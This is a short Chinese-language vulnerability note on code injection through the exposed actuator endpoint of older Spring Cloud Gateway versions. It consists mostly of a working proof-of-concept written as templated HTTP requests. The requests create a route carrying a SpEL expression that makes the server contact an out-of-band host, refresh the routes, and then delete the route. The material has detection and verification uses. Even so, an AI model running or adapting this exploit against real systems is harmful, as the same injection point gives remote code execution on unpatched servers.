验证漏洞存在方法
    - 发送特定的HTTP请求序列检测漏洞，观察响应状态码和DNS交互

漏洞利用方法
    - Spring Cloud Gateway在3.1.1+和3.0.7+之前的版本中，当Gateway Actuator端点启用、暴露且未受保护时，容易受到代码注入攻击
    - 远程攻击者可以构造恶意请求，允许在远程主机上执行任意代码
    - PoC:
```
POST /actuator/gateway/routes/{{randstr}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/{{randstr}}/**"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "#{T(java.net.InetAddress).getByName(\"{{interactsh-url}}\")}",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "{{RootURL}}",
  "order": 0
}

POST /actuator/gateway/refresh HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "predicate": "Paths: [/{{randstr}}], match trailing slash: true",
  "route_id": "{{randstr}}",
  "filters": [
    "[[RewritePath #{T(java.net.InetAddress).getByName(\"{{interactsh-url}}\")} = /${path}], order = 1]"
  ],
  "uri": "{{RootURL}}",
  "order": 0
}

DELETE /actuator/gateway/routes/{{randstr}} HTTP/1.1
Host: {{Hostname}}
```
